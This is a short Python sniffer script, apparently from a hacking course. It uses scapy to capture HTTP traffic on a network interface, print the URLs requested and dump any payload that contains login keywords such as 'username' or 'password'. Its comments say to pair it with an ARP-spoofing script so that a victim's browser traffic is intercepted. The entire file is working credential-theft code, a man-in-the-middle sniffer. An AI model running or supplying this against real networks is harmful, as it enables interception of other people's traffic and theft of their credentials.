#!/usr/bin/env python
#Chapter---59-iface->intrface, store-> stored the information..inbuilt
#User name and password extraction + URLs
#print(packet.show()) helps to see packet field
#ARP spoof and Sniff.....run arpspoofing8.py in another terminal and run the windows browser and see
#------------------------Python3-----------------


import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store = False, prn = process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = str(packet[scapy.Raw].load)
		keywords = ["username", "uname","login","pass", "password"]
		for keyword in keywords:
			if keyword in load:
				return load					

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):		
		url = get_url(packet)
		print("[+] HTTP Request >>> ", url.decode())  # instead of str, decode is 
							      #used to convert into string
		
		login_info = get_login_info(packet)
		if login_info:
			print("\n\n [+] Possible username/password >>>", login_info, "\n\n")
		

sniff("eth0")

